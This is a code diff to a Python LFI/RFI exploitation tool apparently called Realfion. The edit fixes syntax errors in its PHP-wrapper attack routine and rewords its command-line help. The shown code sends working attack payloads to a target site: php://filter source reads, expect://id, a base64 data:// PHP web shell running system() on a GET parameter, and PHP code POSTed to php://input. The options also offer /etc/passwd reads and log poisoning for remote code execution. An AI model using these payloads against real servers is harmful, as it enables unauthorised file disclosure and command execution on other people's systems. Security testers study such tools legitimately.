@@ -162,19 +162,24 @@ class Realfion:
         return (ok, str(method))
 
     def lfiWrappers(self):
-        bool ok = False
+        ok = False
         print(f'\n\n{bcolors.OKBLUE}Trying php wrappers..{bcolors.ENDC}')
         f = open('output_wrappers.txt', 'w+')
         r = requests.get(self.url + 'php://filter/read=convert.base64-encode/resource=' + self.page.replace('.php', ''))
-        self.printRequest(f, getTextLen(r.text), ok |= self.isLFI(r.text), 'php://filter/read=convert.base64-encode/resource=' + self.page.replace('.php', ''))
+        ok |= self.isLFI(r.text)
+        self.printRequest(f, getTextLen(r.text), self.isLFI(r.text), 'php://filter/read=convert.base64-encode/resource=' + self.page.replace('.php', ''))
         r = requests.get(self.url + 'php://filter/read=convert.base64-encode/resource=' + self.page)
-        self.printRequest(f, getTextLen(r.text), ok |= self.isLFI(r.text), 'php://filter/read=convert.base64-encode/resource=' + self.page)
+        ok |= self.isLFI(r.text)
+        self.printRequest(f, getTextLen(r.text), self.isLFI(r.text), 'php://filter/read=convert.base64-encode/resource=' + self.page)
         r = requests.get(self.url + 'expect://id')
-        self.printRequest(f, getTextLen(r.text), ok |= (('uid' in r.text) or (self.isLFI(r.text))), 'expect://id')
+        ok |= (('uid' in r.text) or (self.isLFI(r.text)))
+        self.printRequest(f, getTextLen(r.text), ('uid' in r.text) or (self.isLFI(r.text)), 'expect://id')
         r = requests.get(self.url + 'data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUW2NtZF0pOyA/Pgo=&cmd=id')
-        self.printRequest(f, getTextLen(r.text), ok |= (('uid' in r.text) or (self.isLFI(r.text))), 'data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUW2NtZF0pOyA/Pgo=&cmd=id')
+        ok |= (('uid' in r.text) or (self.isLFI(r.text)))
+        self.printRequest(f, getTextLen(r.text), ('uid' in r.text) or (self.isLFI(r.text)), 'data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUW2NtZF0pOyA/Pgo=&cmd=id')
         r = requests.post(self.url + 'php://input', data='<?php system("id");?>')
-        self.printRequest(f, getTextLen(r.text), ok |= (('uid' in r.text) or ((self.isLFI(r.text)) and r.status_code != 403)), 'php://input   with <?php system("id"); ?> as POST data')
+        ok |= (('uid' in r.text) or ((self.isLFI(r.text)) and r.status_code != 403))
+        self.printRequest(f, getTextLen(r.text), ('uid' in r.text) or ((self.isLFI(r.text)) and r.status_code != 403), 'php://input   with <?php system("id"); ?> as POST data')
 
         if not ok:
             print(f'\n{bcolors.FAIL}Could not perform LFI with php wrappers{bcolors.ENDC}, trying RFI...')
@@ -242,9 +247,9 @@ def main():
     parser.add_option('-o', '--operating-system', dest='os', default='linux', help='operating system that the machine is running (linux, windows)')
     parser.add_option('-e', '--dont-escape-extension', action="store_false", dest='escape_ext', default=True, help='if you dont want to try to escape the .php extension with null byte and php string concat')
     parser.add_option('--due', '--dont-url-encode', action='store_false', dest='urlEncode', default=True, help='dont upload payloads that are url encoded, enabled by default')
-    parser.add_option('-l', '--logs', action='store_true', dest='findLogs', help='try to find logs (for potential RCE) with the method LFI was found (if found)')
+    parser.add_option('-l', '--logs', action='store_true', dest='findLogs', help='try to find logs (for potential RCE) with the method that LFI detection found (if found)')
     parser.add_option('-m', '--encode-method', '--em', action='store', dest='encodeMethod', help='encode payload with method. separate with ; (e.g. realfion.py -m "/etc/passwd; 1 urlencoded nullbyte")')
-    parser.add_option('--lm', '--logs-method', action='store', dest='logsMethod', help='try to find logs with method specified')
+    parser.add_option('--lm', '--logs-method', action='store', dest='logsMethod', help='try to find server logs with method specified')
     # parser.print_help()
     (options, args) = parser.parse_args()
     if not options.url:
